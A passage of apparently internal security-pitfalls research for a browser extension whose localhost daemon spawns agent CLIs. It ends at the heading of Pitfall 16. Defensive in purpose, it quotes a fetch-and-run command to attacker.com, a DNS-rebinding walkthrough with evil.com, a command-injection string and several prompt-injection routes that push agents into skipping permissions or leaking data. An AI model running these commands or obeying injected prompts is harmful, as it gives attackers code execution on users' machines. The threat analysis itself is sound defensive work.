# Pitfalls Research — v0.9.91 MCP Clients as Providers

**Domain:** Localhost daemon spawning agent CLIs on request from a browser (MV3) surface, driving the user's live tabs via FSB's MCP tools
**Researched:** 2026-07-10
**Confidence:** HIGH (security section verified against 2025-2026 CVEs and vendor advisories; MV3/child_process sections verified against Chrome/Node.js docs; product sections HIGH on Anthropic/OpenAI vendor pages)

## Executive Framing

The v0.9.91 delegation channel turns a browser click ("Run this task with Claude Code") into `execve(claude, -p, <user-prompt>)` inside a localhost daemon that already speaks MCP to the extension. That composition — **browser-origin request → localhost daemon → CLI subprocess with the user's shell privileges → MCP tools that drive the live browser** — has been an active RCE surface across the entire 2025-2026 wave of agent tooling incidents (MCP Inspector CVE-2025-49596, MCP SDK DNS-rebinding CVE-2025-66414/66416, Claude Code project-files CVE-2025-59536, Gemini CLI CVSS 10 workspace-trust bypass, TrustFall one-keypress RCE across Claude/Cursor/Gemini/Copilot). Every one of these was a "trust boundary was assumed but never enforced" failure. This milestone must ship enforcement in the first phase that opens the spawn channel; every pitfall below has been chosen to prevent one specific incident class that has already happened in the wild.

---

## Critical Pitfalls

### Pitfall 1: Missing Origin / Host validation on the ws://localhost:7225 delegation channel (CSWSH → spawn RCE)

**What goes wrong:**
An attacker-controlled webpage the user visits in another tab opens a WebSocket to `ws://localhost:7225`, sends the same "spawn Claude Code with prompt X" reverse-request the extension would send, and the daemon happily spawns `claude -p "curl attacker.com/x | sh"` with the user's shell privileges. This is textbook Cross-Site WebSocket Hijacking (CSWSH). Mailpit, Dozzle (CVE-2026-44985), and Nanobot WhatsApp Bridge all shipped this exact vulnerability in 2025-2026 by accepting all origins.

**Why it happens:**
Localhost feels safe. WebSocket handshakes are HTTP under the hood but browsers do not enforce CORS on WebSocket upgrades — same-origin policy does not apply. Developers assume `bind: 127.0.0.1` = "only my code can reach it". It is not: any page in any tab, extension, or app on the machine can dial localhost freely.

**How to avoid:**
1. **Strict `Origin` allowlist on `WebSocket upgrade`.** Reject the handshake if `Origin` header is not `chrome-extension://<known-fsb-id>` or an explicit dashboard origin. The existing `tests/mcp-bridge-topology.test.js` already rejects untrusted browser origins for MCP — extend the same check to the new reverse-request channel.
2. **`Sec-WebSocket-Protocol` or query-string shared secret.** Extension sends a randomly generated per-install token; daemon rejects handshakes without it. Rotate on daemon restart. Do not rely on this alone (see Pitfall 5); pair it with Origin.
3. **`Host` header must equal `127.0.0.1:7225` or `localhost:7225`.** Anything else is DNS rebinding.
4. **Never bind to `0.0.0.0`.** Only `127.0.0.1`. `0.0.0.0` also binds LAN and Docker bridges.

**Warning signs:**
- Any handler that does not check `req.headers.origin` before `ws.accept()`.
- Any code path that accepts a spawn request from a message received before both Origin and shared-secret checks passed.
- Bridge topology tests that only test extension→daemon success, never attacker-page→daemon rejection.

**Phase to address:**
Phase 60 (the phase that first opens the reverse-request channel). Zero exceptions — this cannot be deferred to a "hardening" phase because the daemon is already RCE-adjacent from the moment `claude -p <prompt>` becomes callable from the wire.

---

### Pitfall 2: DNS rebinding against ws://localhost:7225 (RCE via attacker-controlled DNS)

**What goes wrong:**
Attacker publishes DNS for `evil.com` with TTL 0 pointing first to their server, then to `127.0.0.1`. Victim visits `evil.com`; the browser fetches the malicious JS with `Origin: https://evil.com`. That page opens `WebSocket("ws://evil.com:7225")`. Second DNS lookup returns 127.0.0.1. The browser sends the handshake to the daemon with `Origin: https://evil.com` and `Host: evil.com:7225`. If either check is loose, the daemon spawns a subprocess for the attacker.

Every major MCP SDK shipped this vulnerability in 2025: **CVE-2025-66414** (TypeScript SDK) and **CVE-2025-66416** (Python SDK) — DNS rebinding protection was disabled by default on localhost. MCP Inspector's **CVE-2025-49596** (CVSS 9.4) was the same class: the browser-facing proxy accepted arbitrary stdio commands with no origin gate, and DNS rebinding turned it into 1-click RCE for anyone visiting a page while running Inspector.

**Why it happens:**
Developers whitelist "localhost" or "127.0.0.1" on `Host` and think they are done, but they never verify that the browser actually resolved the target as loopback. The attacker's `Host: evil.com` does not fail an equality check against "127.0.0.1" — it just fails a poorly-designed one.

**How to avoid:**
1. **Reject any `Host` header whose left side is not `127.0.0.1` or `localhost`.** Case-fold and strip port before compare.
2. **Reject any `Origin` not in the extension-ID allowlist** (see Pitfall 1). Origin is the primary defense; Host is defense-in-depth.
3. **Reference the fix ship path:** MCP TypeScript SDK 1.24.0+ and Python SDK 1.23.0+ added `enableDnsRebindingProtection: true` — the fix pattern (Host validation + Origin allowlist) is documented; port it directly.
4. **Test with a rebind fixture.** Add a test that sends a handshake with `Origin: https://evil.com` and `Host: 127.0.0.1:7225` — must reject even though Host is loopback.

**Warning signs:**
- Any comment saying "we only bind to localhost, so this is safe."
- Missing `enableDnsRebindingProtection`-equivalent in the WS server config.
- Test suite lacks an explicit rebind rejection case.

**Phase to address:**
Phase 60 (same phase as Pitfall 1 — same code path). Tests must include both Origin-mismatch and Host-mismatch fixtures before merge.

---

### Pitfall 3: Prompt injection into the spawn-with-user-prompt payload → RCE

**What goes wrong:**
The side panel receives a task prompt like "Book me a flight to Tokyo". That prompt is passed via the reverse-request channel to the daemon, which invokes `claude -p "<user prompt>" ...`. If the prompt payload can carry a nested MCP `initialize` block, config-file path, or repository trust dialog answer, an attacker who tricks the user into pasting a poisoned prompt (or who owns a page that generates suggested prompts) can:
- Force `--dangerously-skip-permissions` into the flag set (see Pitfall 4).
- Point `--mcp-config` at a malicious config that auto-approves a shell-executing MCP server.
- Embed hidden instructions the CLI treats as guidance the moment it reads a page.

Real 2025-2026 evidence: **CVE-2025-59536** (Claude Code project files → RCE + API token exfiltration), **CVE-2025-54794 / CVE-2025-54795** (whitelisted-command injection: `echo "\"; <COMMAND>; echo \""`), **TrustFall** (folder-trust bypass across Claude/Cursor/Gemini/Copilot CLIs, disclosed May 2026, one Enter keypress = RCE), and the Palo Alto Unit 42 write-up documents in-the-wild indirect prompt injection where a Reddit comment caused an agent browser to exfiltrate private data.

**Why it happens:**
Developers treat the "prompt" as opaque text and hand it to the CLI as-is. But every agent CLI's process model is: (prompt + tool results + file contents) → LLM → tool calls. The moment the daemon executes `claude -p <untrusted string>`, every downstream trust boundary in the CLI is being asked to defend against attacker-supplied text that arrived from a browser.

**How to avoid:**
1. **Extension is the ONLY origin of the delegation request.** Never accept a spawn request whose prompt came from an external page (side panel is the single canonical origin). The bridge already rejects untrusted browser origins for MCP — the delegation channel must apply the same rule.
2. **Strict argv construction.** No shell interpolation; use `execFile`/`spawn` with an argv array, never `sh -c`. Cite: CVE-2025-54795 was command-injection through whitelisted commands — never build the argv by concatenating strings.
3. **Fix the flag set daemon-side, not client-side.** The daemon supplies `--strict-mcp-config`, agent-definition path, permission mode, and cwd; the extension provides ONLY the prompt string and adapter selector. If any flag can be overridden by the reverse-request payload, treat it as a control-plane input and reject unknown keys.
4. **Ship the `fsb` agent definition instead of prompt-stuffing.** The Key Context in PROJECT.md already commits to this — enforce it: user prompt goes to `--append-system-prompt` or `-p` positional, never into `--system-prompt` or `--mcp-config`.
5. **Consent tiers.** First delegation to a given CLI must be explicit-user-approve (control-panel toggle). Subsequent runs in the same session can be silent. Explicit warning language ("This will spawn Claude Code on your machine with permission to control this browser").
6. **Log-only prompt review.** Persist every prompt sent to a CLI in a ring buffer (redacted for secrets); surface it in a "recent delegations" list. Post-facto audit is the last line of defense.

**Warning signs:**
- The delegation payload accepts arbitrary CLI flags from the wire.
- Any string is passed to a shell (`sh -c`, `bash -c`, `cmd /c`).
- The extension side-panel prompt input is not distinguishable from a prompt injected via a content-script message or an external page.
- No storage of executed prompts for post-hoc audit.

**Phase to address:**
Phase 60 (channel design) for the argv/flag-fix, Phase 61 (adapter contract) for the "no external-page origins" rule, Phase 62 (UX consent) for the first-time approval tier. This pitfall spans multiple phases because it is a defense-in-depth problem; do NOT let any of the three slip.

---

### Pitfall 4: Auto-approve / `--dangerously-skip-permissions` as a default or convenience option

**What goes wrong:**
"MVP should just work" pressure leads to shipping `--dangerously-skip-permissions` (Claude Code), `--yolo` (Gemini CLI), or `--full-auto` (Codex `exec` with auto-approval) as the default or as a one-click toggle. The moment that flag is on, any prompt injection (Pitfall 3), any CSWSH (Pitfall 1), any rebinding (Pitfall 2), or any repository-trust bypass (TrustFall) becomes silent RCE with the user's full shell privileges.

The `--dangerously-skip-permissions` name was chosen by Anthropic literally because "it's exactly what happens." Vendors classify it as user's-informed-consent territory — meaning your product, not theirs, is on the hook if you ship it as a convenience default.

**Why it happens:**
Confirmation prompts hurt demo videos. Product wants "one click and it goes." Engineering knows the safe path is annoying. The `--yolo` name in Gemini CLI ships for the same reason. Then TrustFall (May 2026) proved every agent CLI's trust dialog can be bypassed by malicious project settings, meaning even the vendor's own confirmation UI is not always reliable.

**How to avoid:**
1. **Never expose `--dangerously-skip-permissions` or equivalent through FSB's spawn payload.** The daemon controls the flag set; the reverse-request channel cannot request it. This must be a permanent invariant, not an "MVP posture we relax later."
2. **Default to Claude Code's `--permission-mode strict` or the equivalent tightest mode.** Every subsequent tool call inside the CLI goes back through user consent — either via the CLI's own dialog OR (better) via FSB's own MCP consent surface.
3. **Route permission prompts back to the side panel.** When the spawned CLI asks "run rm -rf?", the CLI's dialog must be captured (via `--permission-prompt-tool` or the ACP equivalent) and reflected in FSB's UI, not answered by the daemon. FSB owns the yes/no because FSB owns the human.
4. **Explicit "advanced" mode gate.** If a user genuinely wants a looser posture, require a control-panel checkbox that names the specific risk ("This lets the agent modify files without asking. Attackers who reach this channel can run arbitrary code."). Do not name the toggle "Fast mode."

**Warning signs:**
- Any code that has a boolean like `autoApprove: true` in the adapter contract.
- Any UI copy that describes bypass as "faster" or "smoother" without naming the risk.
- Any test that requires bypass to be on for the flow to succeed. If your happy path needs bypass, your happy path is broken.

**Phase to address:**
Phase 60 (adapter contract locks the flag set) + Phase 62 (UX explicitly denies the "make it fast" toggle). Add a lint or test that grep-fails the build if `--dangerously-skip-permissions` appears anywhere in the daemon spawn path outside a marked "advanced-mode" branch.

---

### Pitfall 5: Weak / leaked shared secret between extension and daemon

**What goes wrong:**
The extension→daemon shared secret leaks via any of: `chrome.storage.local` (readable by other extensions with the right permission and by any process that reads the profile directory), diagnostic logs (redaction gap), the URL query string of a WebSocket handshake (logged by proxies and by some OS-level packet capture), or a static config file the daemon reads with world-readable permissions. Anything with the secret can spawn arbitrary CLIs as the user.

**Why it happens:**
It is easy to write `?token=abc123` in the WS URL. It is easy to `console.log(token)` while debugging. It is easy to store the secret in `chrome.storage.local` and forget that `chrome.storage.local` is NOT the same trust boundary as macOS Keychain.

**How to avoid:**
1. **Per-install random token (>=32 bytes, `crypto.randomUUID()` at minimum, prefer `getRandomValues(new Uint8Array(32))`).**
2. **Rotate on daemon restart.** The extension picks up the new token via a small pairing handshake gated by (a) the daemon writing a file under the user's home directory with mode 0600 that the extension reads via a native manifest, or (b) a one-time pairing code the user copies from `fsb-mcp-server pair`.
3. **Send in `Sec-WebSocket-Protocol` (never the URL).** URL query strings show up in access logs, DevTools waterfalls, and proxy captures. `Sec-WebSocket-Protocol` is a first-class handshake header.
4. **Redaction bar covers the token.** Extend the existing `redactForLog` helper (from v0.9.45rc1 Phase 211) to strip `token=...` and `Sec-WebSocket-Protocol: fsb-...` patterns.
5. **Do NOT make the token the only defense.** Origin allowlist (Pitfall 1) is still primary. If the token leaks (it will eventually), the Origin check must still block attacker pages.

**Warning signs:**
- Token appears in any `console.log` or diagnostic ring buffer entry.
- Token stored in `chrome.storage.sync` (syncs across devices — huge leak surface).
- File-based token has mode > 0600.
- Rotation policy is "never" or "on Chrome restart" (which almost never happens).

**Phase to address:**
Phase 60 (channel design + secret contract). The rotation UX ships with Phase 62.

---

### Pitfall 6: Zombie/orphaned child processes on cancel or crash (especially on Windows)

**What goes wrong:**
User clicks "Cancel". Daemon calls `child.kill()`. On POSIX, that sends SIGTERM to the parent CLI process — but Claude Code / Codex / Gemini CLI often spawn sub-processes (git, ripgrep, MCP servers, editors). The signal does not propagate to the tree. Sub-processes keep running, keep charging tokens, and if any of them held a `chrome.debugger` attachment or a browser session, they keep manipulating the browser after the user thought they cancelled. On Windows, POSIX signals do not exist at all — the `kill()` call is essentially always SIGKILL and does not walk the tree.

Evidence: **Auto-Claude issue #1252** ("Process cleanup broken - zombie processes accumulate after app close") documents this exact class on Windows. The Node.js docs state explicitly: "On Windows... signal argument will be ignored except for 'SIGKILL', 'SIGTERM', 'SIGINT' and 'SIGQUIT', and the process will always be killed forcefully." Multiple community write-ups document that `child_process.kill()` on Linux does not kill grandchildren.

**Why it happens:**
Node's `child.kill()` API is deceptively simple. Developers assume the platform does tree-kill. It does not. Also, `wait/waitpid` is not exposed to Node scripts, so zombies (dead-but-unreaped children) accumulate silently.

**How to avoid:**
1. **Spawn detached with a new process group.** POSIX: `spawn(cmd, args, { detached: true })` then `process.kill(-child.pid, 'SIGTERM')` (negative PID = kill the group). Give a graceful window (5 s) then `SIGKILL -child.pid`.
2. **Windows: use `taskkill /pid <pid> /T /F`.** `/T` = tree, `/F` = force. This is the only reliable tree kill on Windows.
3. **Cross-platform: use a well-tested library.** `tree-kill` npm package handles both. Verify it is maintained (last audit in v0.9.30 covered `chrome.tabs` — do a fresh look here).
4. **Watchdog for orphans.** On daemon startup, scan the process tree for any `claude`/`codex`/`gemini` process whose parent is init/1 and whose command line contains an FSB-tagged env var (`FSB_DELEGATION_ID=...`). Kill it. This prevents accumulation after daemon crashes.
5. **Reap on exit.** Register `child.on('exit', ...)` to `waitpid` implicitly (Node's default) — but log exits so accumulating zombies get diagnosed.
6. **Handle `child.on('error')`.** Every spawn can fail (ENOENT, EPERM); missing error handlers leave dangling promises the UI never resolves.

**Warning signs:**
- Any `child.kill()` without a `{ detached: true }` spawn and negative-PID kill.
- No Windows-specific `taskkill /T` branch.
- No orphan scan on daemon startup.
- User reports of "Claude Code kept running after I cancelled" or unexplained token burn.

**Phase to address:**
Phase 61 (adapter contract defines kill semantics per adapter). This is a "shipped-wrong-once, sits in the wild forever" pitfall — get it right first time.

---

### Pitfall 7: Stdout backpressure on stream-json output deadlocks the CLI

**What goes wrong:**
Claude Code's `--output-format stream-json` and Codex's `--json` both emit newline-delimited JSON at the rate the model produces tokens (fast — thousands of lines per minute for a chatty run). The daemon reads `child.stdout`. If the daemon does NOT drain the stdout stream fast enough (or holds it while awaiting an async op), the kernel pipe buffer fills, `write()` in the child blocks, and the CLI deadlocks with the model half-through a turn. The stall looks like "Claude is thinking" to the user, but the CLI is not — it is blocked on write.

Node.js streams do this correctly IFF you use `pipe()` or `pipeline()`, but if you use manual `stdout.on('data', ...)` and do async work in the handler without pausing/resuming, you WILL leak or deadlock. From the Node docs: "When a false value is returned, the backpressure system kicks in. It will pause the incoming Readable stream from sending any data..."

**Why it happens:**
Developers treat stdout like "just a stream of text" and forget it is a real OS pipe with a real 64 KB buffer.

**How to avoid:**
1. **Use `readline.createInterface({ input: child.stdout })` for line-by-line JSONL parsing.** Do not accumulate the raw buffer in memory.
2. **Emit every parsed event immediately to the extension via the existing bridge; do not await downstream work in the parse callback.** If you must, buffer to a bounded in-memory queue with backpressure.
3. **Cap the queue.** If the extension side stops reading (side panel closed), the queue must either drop-with-notice or apply backpressure back to the CLI via `child.stdout.pause()`.
4. **Route stderr separately.** Codex sends progress to stderr, final message to stdout. Do not merge streams; each has its own backpressure.
5. **Log the read rate.** If stdout emission suddenly drops for >10 s but the child is still alive, that is either the model hanging OR a backpressure deadlock — surface as a diagnostic.

**Warning signs:**
- Manual `Buffer.concat(chunks)` accumulation in the stdout handler.
- Any `await someLongOp()` inside the `data` event handler.
- User reports of "Claude gets stuck at the same step every time."

**Phase to address:**
Phase 61 (adapter contract). The base adapter should expose a `stream()` async iterator; individual adapters (Claude/Codex/Gemini) fill in the parse rules.

---

### Pitfall 8: Daemon crashes mid-run and the spawned CLI keeps controlling the browser

**What goes wrong:**
Daemon process dies (OOM, uncaught exception, SIGSEGV in a native module). The spawned `claude -p` process was NOT parented under a process group the OS will reap; it becomes a zombie with `init` as its new parent. Its MCP client still holds a WebSocket to the extension (which auto-reconnects). It keeps executing tool calls the user cannot see because the side panel lost its progress stream when the daemon died. The browser gets clicked at, the user is confused.

**Why it happens:**
`{ detached: true }` for tree-kill (Pitfall 6) creates exactly this failure mode if it is not paired with a parent-liveness protocol.

**How to avoid:**
1. **Extension-side heartbeat.** Every N seconds, extension pings the daemon; if 3 pings missed, extension terminates all agent-owned tabs' MCP sessions and marks agents as `daemon:disconnected`. Existing v0.9.60 agent-cap and connection-id reconnect grace patterns extend cleanly.
2. **Spawned CLI must exit if its MCP transport dies.** For CLIs that connect to FSB's MCP as a client (they do), the transport disconnection should terminate the CLI. Verify per adapter: Claude Code exits when MCP dies? Codex? Gemini? Document per-adapter behavior in the adapter contract.
3. **Daemon restart handshake.** On restart, daemon lists live child processes via the FSB env-var scan (Pitfall 6 #4) and either adopts them (rejoin) or kills them. Do NOT default to adopt — a resurfaced daemon with a stale token is exactly the CSWSH scenario in Pitfall 1.
4. **Side-panel graceful "daemon offline → doctor" state.** PROJECT.md already commits to this in "Key context" — enforce that Phase 62 ships it before the delegation MVP claims ready.

**Warning signs:**
- No daemon-liveness heartbeat.
- CLI processes survive daemon exit and continue reaching the extension via MCP.
- Doctor state is a spinner instead of an actionable "Restart daemon: `npx -y fsb-mcp-server serve`" step.

**Phase to address:**
Phase 62 (daemon lifecycle + doctor handoff). Add a test that spawns a fake CLI, kills the daemon, and asserts the extension sees the outage within 10 s.

---

### Pitfall 9: Agent CLI stdout/flag/schema drift between versions

**What goes wrong:**
Claude Code ships a new version that renames `--output-format stream-json` → `--stream=json`, or Codex renames event fields (`item.type` → `item.kind`). FSB delegation instantly breaks silently: the CLI runs, but the daemon does not recognize any events, the side panel shows nothing, the user sees "Claude is thinking" forever. Alternatively: the CLI's JSONL schema adds a new event type FSB does not handle, and FSB either crashes on `undefined` fields or shows garbled state.

Evidence: the Claude Code `stream-json` format is documented as evolving (open GitHub issues #24594 and #24612 in 2026 asking Anthropic to actually document the schema); users report `--continue` silently creating a new session in non-interactive `-p` mode (see Pitfall 12); Anthropic paused a June 15 billing change for `claude -p` after the ecosystem reacted, showing the CLI surface is under active behavior churn.

**Why it happens:**
Agent CLIs are moving faster than any documented contract. FSB does not own them.

**How to avoid:**
1. **Adapter version detection.** Every adapter runs `<cli> --version` on selection and records the version in the agent-provider metadata. Ship a compatibility matrix per adapter (e.g., "Claude Code ≥ 2.1 confirmed; 1.x unsupported").
2. **Fail loudly on unknown events.** Parse every JSONL line; if `event.type` is not in the known set, log with the raw line, DO NOT drop silently. Surface as `agent_protocol_drift` in the diagnostics ring buffer.
3. **Schema smoke on adapter update.** CI job runs each adapter against a canned "print hello and exit" prompt, asserts a known event sequence. Detects drift on every new adapter release.
4. **Doctor exposes the version.** `fsb-mcp-server doctor` shows adapter versions so users can report mismatches.
5. **Adapter contract makes parse errors non-fatal to the run.** An unknown event should not kill the CLI — just annotate the progress stream "1 event not understood."

**Warning signs:**
- Adapter code references specific event field names without a schema version guard.
- Any `switch (event.type) { case 'x': ...; }` without a `default: log unknown`.
- User bug reports of "delegation used to work, broke after I updated Claude Code."

**Phase to address:**
Phase 61 (adapter contract MUST embed version + compatibility). Phase 63 (CI drift-smoke gate) — this deserves its own phase because the drift will keep happening across the milestone's life.

---

### Pitfall 10: MV3 service worker eviction during a long delegated run kills the extension side of the pipeline

**What goes wrong:**
User kicks off a 45-minute delegation task. Chrome's MV3 service worker terminates after **30 seconds of inactivity** and after **5 minutes on any single event**. The spawned CLI is still running fine in the daemon; the daemon's MCP link auto-reconnects when the SW respawns; but every SW respawn drops in-memory state (running delegation → agent-id mapping, progress buffer, side-panel channel), and the user's side panel goes blank or worse — the side panel shows a stale state that does not match what the CLI is actually doing.

Chrome docs: "The service worker terminates after 30 seconds of inactivity" and "The service worker terminates if a single request... takes longer than 5 minutes to process." WebSocket messages reset the idle timer (Chrome 116+), which helps IF the delegation heartbeats fast enough — but if the model pauses for 60 s on a hard step, the SW dies mid-run.

**Why it happens:**
MV3 was designed for reactive, short-lived event handlers. Delegated runs are neither.

**How to avoid:**
1. **Persist delegation state in `chrome.storage.session`** (v0.9.36's visual-session pattern already does this; extend the same discipline). Every progress event → write. On SW respawn → read.
2. **Heartbeat WebSocket every 20 s from the daemon side.** Even if the CLI is silent, send a `keep_alive` frame. This resets the SW's 30 s idle timer.
3. **Load-bearing pattern from v0.10.0 INV-04:** the `setTimeout`-chained iterator survives SW eviction. Extend that pattern to the delegation supervisor — write state before each await, resume from persisted state on wake.
4. **Do NOT rely on offscreen documents for WebSocket.** Chrome does not officially support WebSocket in offscreen documents (per the Chrome team). The offscreen doc pattern is for audio and DOM parsing, not for network keepalive.
5. **Alarm-based backup.** `chrome.alarms.create('fsb-delegation-heartbeat', { periodInMinutes: 0.5 })` fires even if idle; use to poll persisted state.
6. **Warn the user for very long runs.** If a delegation crosses 5 min, show "Long run in progress — do not close the browser."

**Warning signs:**
- Any in-memory Map in the SW that holds delegation state.
- No `chrome.storage.session` write after each progress event.
- Test suite lacks a "kill SW mid-delegation, respawn, assert state recovery" case.

**Phase to address:**
Phase 62 (SW lifecycle + persistence for delegated runs). Verify the v0.9.24 `setTimeout`-iterator pattern was preserved through v0.10.0 Lattice integration — INV-04 is load-bearing here.

---

### Pitfall 11: Source-pin tripwire tests break the moment the extension gets wired to delegation

**What goes wrong:**
FSB's test suite pins **exact token counts and exact substrings** in extension source files (e.g., `extension/background.js`). Even a comment change breaks tests. The v0.9.91 milestone REQUIRES adding delegation wiring to `background.js`, `ui/onboarding.js`, `ui/control_panel.html`, and `engine-config.js` (fifth EXECUTION_MODES entry). Any edit will trip the pin unless the test is updated in the same commit. The auto-memory note is explicit: "even comments (e.g. the word 'importScripts' in background.js) break the suite."

**Why it happens:**
Tripwires were added to catch accidental deletions/regressions. They cannot distinguish accidental from intentional.

**How to avoid:**
1. **Run the full test suite from commit 1 of the milestone.** PROJECT.md Key Context already commits to this — enforce it (CI gate on every PR).
2. **Every extension-source edit must include a paired tripwire update in the same commit.** Grep the test suite for the file being edited BEFORE editing; enumerate pinned substrings/counts; plan the updates.
3. **New symbols in `background.js` must have their tripwire seeded from the first commit** (initial token-count pin, initial substring assertion). Do not "add later" or the diff over the milestone becomes untraceable.
4. **The delegation dispatcher must integrate through `fsbDispatchInternalMessage` (background.js:8731)** — do NOT use `chrome.runtime.sendMessage` for same-SW-context dispatch. Auto-memory: "sendMessage never loops back in-SW." Same-context dispatch pattern was chosen deliberately in the Phase 225-01 bus.

**Warning signs:**
- CI red on the first extension-wiring commit with a "token count mismatch" or "substring not found" error.
- Any use of `chrome.runtime.sendMessage` from background code to another background handler.
- New extension source without a corresponding new tripwire.

**Phase to address:**
Every phase that touches extension source. Add a milestone-level gate in Phase 57 (requirements definition) that says "no extension-side phase can merge if the tripwire suite is red."

---

### Pitfall 12: Chat-thread vs one-shot mismatch (`--resume` vs `-p` semantics)

**What goes wrong:**
User expects delegation to be a conversation — they type a follow-up, agent picks up where it left off. FSB naively uses `claude -p <prompt>` each time. Each call is a fresh session; the agent has no memory of the previous turn. Alternatively: user thinks the same "conversation" is running in parallel across two side-panel starts; actually two sessions collide.

Documented Claude Code footgun: **"In non-interactive mode with `-p`, `--continue` can silently create a new session rather than resuming the existing one."** Scripts that rely on `--continue` for stateful pipeline work fail silently. Explicit `--resume <session_id>` is the only reliable mode.

**Why it happens:**
`-p` (print-and-exit) and `--resume` are two different execution models; the CLIs make it too easy to invoke `-p` without realizing chat continuity is off.

**How to avoid:**
1. **Adapter contract has explicit `mode: 'task' | 'chat'`.** `task` = fresh session, one-shot; `chat` = session_id must be provided.
2. **FSB persists `session_id` per (side panel, adapter).** On follow-up, pass `--resume <session_id>`. On new task, mint a new session.
3. **Explicit UI affordance.** Side panel shows "Start new task" vs "Continue this conversation" with clear resume behavior.
4. **Per-adapter capabilities matrix.** Claude Code: `--resume` supported, `--continue` unreliable in `-p`. Codex `exec`: turn-based, no persistent session (yet). Gemini CLI: TBD, verify per version. Adapters must expose `caps.chatMode: boolean`.

**Warning signs:**
- Same-session follow-ups produce agent responses like "I don't have context on your previous request."
- Two concurrent side-panel runs overwrite each other's session state.
- No `session_id` recorded in persisted delegation state.

**Phase to address:**
Phase 61 (adapter contract) defines the two modes. Phase 62 (UX) ships the affordance.

---

### Pitfall 13: Cold-start latency shocks the user

**What goes wrong:**
User clicks "Delegate to Claude Code". Side panel spinner runs for 3-8 seconds while: (a) the daemon spawns `node` (~150-300 ms cold), (b) the CLI initializes (`claude` reads config, loads MCP servers, warms cache — 1-3 s), (c) the first LLM turn returns (2-5 s depending on model). User assumes it hung; clicks again. Now there are two delegated runs on the same tab (Pitfall 15).

Node.js cold start alone is 150-300 ms per credible sources; the agent CLI stack on top of that pushes total to 3-8 s realistically for the first invocation.

**Why it happens:**
Every delegation launches a fresh CLI subprocess. There is no warm pool. First-turn latency compounds Node init + CLI init + LLM first token.

**How to avoid:**
1. **Optimistic UI.** Show "Starting Claude Code…" with progress step names (spawning → initializing → sending first prompt) so the user knows work is happening.
2. **Idempotent "Delegate" button.** Debounce and disable the button while a spawn is in flight. Multiple clicks CANNOT produce multiple spawns.
3. **Warm daemon.** The daemon can pre-fork the Node process pool or keep one CLI warm per selected adapter (memory tradeoff). For MVP: SKIP warm-pool; instead, focus on honest UX (step names).
4. **Cache the "installed clients" detection.** Don't re-scan disk (`platforms.ts` per-OS paths) on every side-panel open — this cost accumulates.
5. **Manage user expectations in copy.** The side panel button should read "Delegate (may take a few seconds to start)" rather than "Run" which implies immediacy.

**Warning signs:**
- User double-clicks producing two parallel spawns.
- No progress state between "click" and "first agent output".
- Detection scan running on every side-panel focus event.

**Phase to address:**
Phase 62 (delegation UX). Warm pool is deferred beyond MVP — do NOT add it in v0.9.91.

---

### Pitfall 14: Cost surprises on subscription vs API billing

**What goes wrong:**
User is on Claude Pro subscription, thinks delegated runs are "free" from their perspective. Reality (as of 2026): Anthropic **announced** on May 14, 2026 that programmatic `claude -p` and Agent SDK usage would be metered separately at API rates, then **paused** the change on June 15, 2026, promising advance notice before any future implementation. So the billing model is currently unchanged but explicitly uncertain. Meanwhile OpenAI Codex, Gemini CLI, and third-party CLIs each have their own subscription/API split that FSB does not control.

Compounded risk: a runaway agent (Pitfall 3, Pitfall 4) can burn through a subscription's request quota OR blow API credits in minutes. Reported industry norm: "A runaway agent or a bad prompt can burn through credit fast and then either stop your pipeline or quietly start garnering extra usage."

**Why it happens:**
FSB has no visibility into the CLI's billing model; the CLI has no visibility into FSB's intent.

**How to avoid:**
1. **Per-adapter billing disclosure in the Providers panel.** For each agent provider, show a one-liner: "Claude Code: uses your Claude subscription today; Anthropic has announced future changes — check status." Link to the vendor's current billing docs.
2. **Session-level token/turn ceiling.** The delegation payload includes a max-turns cap (e.g., 50 turns default). Adapter passes to the CLI where supported (Claude Code: `--max-turns`; Codex `exec`: turn count limit). If unsupported, FSB kills the CLI at the cap.
3. **Live token estimate in side panel.** The v0.9.69 telemetry pipeline already models per-MCP-client token/cost per turn — reuse for delegation. Show cumulative estimate, not just a raw count.
4. **Warn on billing model changes.** If a new Anthropic pricing announcement lands during the milestone (or any adapter's), Providers panel copy MUST reflect the new state within the release cycle. Do NOT hardcode "free with your subscription" language.
5. **Post-run cost summary.** Every delegated run ends with a card summarizing turns / tokens / estimated cost.

**Warning signs:**
- Copy that says "unlimited" or "free" for any adapter.
- No max-turn cap in the spawn payload.
- No post-run cost summary.

**Phase to address:**
Phase 62 (UX). Reuse v0.9.69 telemetry primitives.

---

### Pitfall 15: The spawned agent and the user fight over the same browser tab

**What goes wrong:**
User delegates "Buy this hoodie". Claude Code starts driving the browser via FSB's MCP. User simultaneously scrolls the same tab, opens a dev tool, or clicks a link. Now:
- Agent's `read_page` returns a snapshot from an in-between state; agent decides "the button is at coord (400, 300)"; user has scrolled; agent's `cdp_click_at` clicks a completely wrong element.
- User clicks "Add to cart"; agent's next tool call is `read_page`; agent sees the cart page, gets confused, tries to navigate back.
- Focus-steal on tab switch collides with the agent's next `switch_tab` call.

Cursor and OpenClaw report this exact bug class. Browser-Use has multiple issues on parent/sub-agent tab conflict.

**Why it happens:**
v0.9.60 already solved multi-agent-per-tab collision via tab ownership. But the ORIGINAL user is not an agent with a tokenized owner — they own the browser physically. There is no code-side lock the user can respect.

**How to avoid:**
1. **Delegation UI explicitly asks: "Let Claude drive this tab, or open a new tab?"** Default: new tab. If new tab, `open_tab` (background) claims ownership for the delegated agent. Original tab stays with the user.
2. **When the user MUST watch (checkout, form fills), show a full-tab banner: "Claude Code is driving this tab. Take control?"** Clicking "Take control" pauses the agent and yields ownership. Existing v0.9.24 partial-outcome + auth-wall handoff patterns provide the receipt.
3. **Change-report reconciliation.** v0.9.60's post-action `change_report` already reports URL/DOM delta between action and observation. Extend to detect "unexpected user input" (URL changed to something the agent did not navigate to → assume user grabbed the wheel, pause the agent).
4. **Explicit lock on interactive fields.** When the agent is typing into a form, install a click-guard overlay (v0.9.36 badge pattern). User click on the guard = "yield control?".
5. **NEVER auto-focus the delegated tab.** Background execution by default (v0.9.60 Phase 246 already commits to this for MCP-routed surfaces — extend to delegation).

**Warning signs:**
- Any code path that steals focus on delegation start.
- No detection of user-initiated navigation during an agent turn.
- User reports "the agent broke because I scrolled."

**Phase to address:**
Phase 62 (delegation UX). Reuse v0.9.60 ownership infrastructure; the delta is user-vs-agent, not agent-vs-agent.

---

### Pitfall 16: Hub/relay bridge topology edge case — hub exits mid-run

**What goes wrong:**
